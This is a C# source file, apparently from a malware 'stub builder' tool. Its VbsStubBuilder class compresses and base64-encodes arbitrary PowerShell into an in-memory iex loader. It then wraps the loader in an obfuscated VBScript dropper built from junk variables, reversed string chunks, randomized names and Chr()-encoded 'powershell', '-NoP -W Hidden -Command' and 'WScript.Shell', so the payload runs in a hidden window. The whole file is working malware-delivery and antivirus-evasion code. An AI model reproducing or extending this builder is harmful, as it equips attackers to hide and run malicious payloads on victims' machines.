using System.IO;
using System.IO.Compression;
using System.Text;

namespace WpfApp.StubBuilders
{
    internal static class VbsStubBuilder
    {
        public static string Generate(string ps1Code)
        {
            byte[] ps1Bytes = Encoding.UTF8.GetBytes(ps1Code);
            using var ms = new MemoryStream();
            using (var gz = new GZipStream(ms, CompressionMode.Compress, true))
                gz.Write(ps1Bytes, 0, ps1Bytes.Length);
            byte[] compressed = ms.ToArray();
            string b64Compressed = Convert.ToBase64String(compressed);

            string psCmd = "$b=[Convert]::FromBase64String('" + b64Compressed + "');$ms=[IO.MemoryStream]::new($b);$gz=[IO.Compression.GzipStream]::new($ms,[IO.Compression.CompressionMode]::Decompress);iex([IO.StreamReader]::new($gz).ReadToEnd())";

            return GenerateObfuscatedVbs(psCmd);
        }

        internal static string GenerateObfuscatedVbs(string b64Payload)
        {
            var rng = new Random();
            var sb = new StringBuilder();

            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(6, 10));

            // ---- junk at top ----
            int junkCount = rng.Next(3, 6);
            for (int i = 0; i < junkCount; i++)
            {
                string jv = VarName();
                sb.AppendLine($"Dim {jv}: {jv} = {rng.Next(100, 9999)} * {rng.Next(2, 99)}");
            }

            // ---- split b64 into chunks and reverse each ----
            int chunkCount = rng.Next(4, 8);
            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
            var chunkVars = new List<string>();

            for (int i = 0; i < chunkCount; i++)
            {
                int start = i * chunkSize;
                if (start >= b64Payload.Length) break;
                int len = Math.Min(chunkSize, b64Payload.Length - start);
                string chunk = b64Payload.Substring(start, len);
                char[] rev = chunk.ToCharArray(); Array.Reverse(rev);
                string vn = VarName();
                chunkVars.Add(vn);
                sb.AppendLine($"Dim {vn}: {vn} = \"{new string(rev)}\"");
            }

            // ---- junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string jv = VarName();
                sb.AppendLine($"Dim {jv}: {jv} = \"{Guid.NewGuid().ToString("N").Substring(0, 8)}\"");
            }

            // ---- reconstruct payload var ----
            string payloadVar = VarName();
            sb.Append($"Dim {payloadVar}: {payloadVar} = ");
            for (int i = 0; i < chunkVars.Count; i++)
            {
                sb.Append($"StrReverse({chunkVars[i]})");
                if (i < chunkVars.Count - 1) sb.Append(" & ");
            }
            sb.AppendLine();

            // ---- build "powershell" from Chr() codes ----
            string psStr = "powershell";
            string psVar = VarName();
            sb.Append($"Dim {psVar}: {psVar} = ");
            var psCodes = new List<string>();
            foreach (char c in psStr)
                psCodes.Add($"Chr({(int)c})");
            sb.Append(string.Join(" & ", psCodes));
            sb.AppendLine();

            // ---- build "-NoP -W Hidden -Command" from Chr() codes ----
            string argStr = "-NoP -W Hidden -Command";
            string argVar = VarName();
            sb.Append($"Dim {argVar}: {argVar} = ");
            var argCodes = new List<string>();
            foreach (char c in argStr)
                argCodes.Add($"Chr({(int)c})");
            sb.Append(string.Join(" & ", argCodes));
            sb.AppendLine();

            // ---- build "WScript.Shell" from Chr() codes ----
            string comStr = "WScript.Shell";
            string comVar = VarName();
            sb.Append($"Dim {comVar}: {comVar} = ");
            var comCodes = new List<string>();
            foreach (char c in comStr)
                comCodes.Add($"Chr({(int)c})");
            sb.Append(string.Join(" & ", comCodes));
            sb.AppendLine();

            // ---- junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string jv = VarName();
                sb.AppendLine($"Dim {jv}: {jv} = Array({rng.Next(1, 9)}, {rng.Next(10, 99)})");
            }

            // ---- build final command (wrap payload in double quotes) ----
            string cmdVar = VarName();
            sb.AppendLine($"Dim {cmdVar}: {cmdVar} = {psVar} & \" \" & {argVar} & \" \" & Chr(34) & {payloadVar} & Chr(34)");

            // ---- create shell object and execute ----
            string shellVar = VarName();
            sb.AppendLine($"Dim {shellVar}");
            sb.AppendLine($"Set {shellVar} = CreateObject({comVar})");
            sb.AppendLine($"{shellVar}.Run {cmdVar}, 0, False");
            sb.AppendLine($"Set {shellVar} = Nothing");

            return sb.ToString();
        }
    }
}
